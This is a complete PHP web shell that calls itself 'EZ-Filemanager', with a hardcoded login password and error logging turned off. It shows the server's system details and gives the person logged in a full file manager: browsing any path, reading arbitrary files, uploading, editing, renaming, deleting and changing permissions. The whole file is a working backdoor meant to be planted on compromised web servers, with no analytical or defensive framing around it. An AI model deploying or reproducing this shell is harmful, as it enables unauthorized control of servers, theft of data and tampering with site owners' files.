<?php session_start();error_reporting(0);set_time_limit(0);@set_magic_quotes_runtime(0);@clearstatcache();@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);@$pass = $_POST['pass'];$cek_login = true;$password = "bokephd";if($pass == $password){ $_SESSION['nst'] = "$pass";}if($cek_login == true){if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password){die("<title>.: EZ-Filemanager :.</title><pre align=center><form method=post><input type=password name=pass placeholder=password style='background-color:whitesmoke;border:1px solid #fff;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56ad15;color:#fff;cursor:pointer;'></form></pre>"); }}if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}echo '<!DOCTYPE HTML><html><head><title>.: EZ-Filemanager :.</title><link rel="stylesheet" href="https://cumaiseng.github.io/assets/mini.css"/></head><body><h1 style="font-family:Kelly Slab;text-align:center;padding-top:10px;border:3px ridge #0584c4;"><a href="?">.: EZ-Filemanager :.</a>';echo"<br><span style='font-size:15px;'>".php_uname()."</span>";if(isset($_GET['path'])){$path = $_GET['path'];}else{$path = getcwd();}$path = str_replace('\\','/',$path);$paths = explode('/',$path);echo '<table width="100%" align="center"><tr><td>';echo "<div style='text-align:left;font-size:13px;'>";echo "&nbsp;Path : ";foreach($paths as $id => $pat) {echo "<a href='?path=";for($i = 0; $i <= $id; $i++) {echo $paths[$i];if($i != $id) {echo "/";} }echo "'>$pat</a>/";}echo "</div>";echo '</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#dee3e5;"><input type="submit" value="Upload"></form></td></tr><tr><td colspan="2"></table></h1>';if(isset($_FILES['file'])){if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){echo '<br><center><font color="#06cc06">Upload OK!</font></center>';}else{echo '<br><center><font color="red">Upload Failed!</font></center>';}}echo '</td></tr><tr><td>';if(isset($_GET['filesrc'])){echo "<br><span style='border-bottom:1px solid #dee3e5;'><tr><td>Current File : ";echo $_GET['filesrc'];echo'</span></tr></td></table><br><br>';echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){echo '</table><br><center>'.$_POST['path'].'<br><br>';if($_POST['opt'] == 'chmod'){if(isset($_POST['perm'])){if(chmod($_POST['path'],$_POST['perm'])){echo '<font color="#06cc06">Success!</font><br>';}else{echo '<font color="maroon">Failed!</font><br>';}}echo '<form method="POST">Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="chmod"><input type="submit" value="Go"></form>';}elseif($_POST['opt'] == 'rename'){if(isset($_POST['newname'])){if(rename($_POST['path'],$path.'/'.$_POST['newname'])){echo '<font color="#06cc06">Success!</font><br><br>';}else{echo '<font color="red">Failed!</font><br><br>';}$_POST['name'] = $_POST['newname'];}echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go"></form>';}elseif($_POST['opt'] == 'edit'){if(isset($_POST['src'])){$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<font color="#06cc06">Success!</font><br><br>';}else{echo '<font color="red">Failed!</font><br><br>';}fclose($fp);}echo'<form method="POST"><textarea cols=100 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save"></form>';}echo'</center>';}else{echo'</table><center>';if(isset($_GET['option']) && $_POST['opt'] == 'delete'){if($_POST['type'] == 'dir'){if(rmdir($_POST['path'])){echo '<font color="#06cc06">Deleted!</font><br><br>';}else{echo '<font color="red">Failed!</font><br><br>';}}elseif($_POST['type'] == 'file'){if(unlink($_POST['path'])){echo '<font color="#06cc06">Deleted!</font><br><br>';}else{echo '<font color="red">Deleted Fail!</font><br><br>';}}}echo '</center>';$scandir = scandir($path);echo '<div id="content"><table width="100%" border="0" cellspacing="1" align="center"><tr class="first"><td style="text-align:center;">Name</td><td style="text-align:center;" width="12%">Size</td><td style="text-align:center;" width="12%">Permission</td><td style="text-align:center;" width="12%">Action</td></tr>';foreach($scandir as $dir){if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;echo '<tr><td style="color:#06cc06;">&#9758; <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td><td><center>--</center></td><td><center>';if(is_writable($path.'/'.$dir)) echo '<font color="#06cc06">';elseif(!is_readable($path.'/'.$dir)) echo '<font color="maroon">';echo perms($path.'/'.$dir);if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';echo '</center></td><td><center><form method="POST" action="?option&path='.$path.'"><Select name="opt" style="text-align:center;"><option value="rename"></option><option value="rename">Rename</option><option value="delete">Delete</option><option value="chmod">Chmod</option></Select><input type="hidden" name="type" value="dir"><input type="hidden" name="name" value="'.$dir.'"><input type="hidden" name="path" value="'.$path.'/'.$dir.'"><input type="submit" value=">"></form></center></td></tr>';}echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';foreach($scandir as $file){if(!is_file($path.'/'.$file)) continue;$size = filesize($path.'/'.$file)/1024;$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}echo '<tr><td style="color:#06cc06;">&#8627; <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td><td><center>'.$size.'</center></td><td><center>';if(is_writable($path.'/'.$file)) echo '<font color="#06cc06">';elseif(!is_readable($path.'/'.$file)) echo '<font color="maroon">';echo perms($path.'/'.$file);if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';echo '</center></td><td><center><form method="POST" action="?option&path='.$path.'"><Select name="opt" style="text-align:center;"><option value="edit">Edit</option><option value="delete">Delete</option><option value="rename">Rename</option><option value="chmod">Chmod</option></Select><input type="hidden" name="type" value="file"><input type="hidden" name="name" value="'.$file.'"><input type="hidden" name="path" value="'.$path.'/'.$file.'"><input type="submit" value=">"></form></center></td></tr>';}echo '</table></div>';}echo '<br><div style="text-align:center; color:white;">.: EZ-Filemanager :.</div></body></html>';function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));return $info;}?>
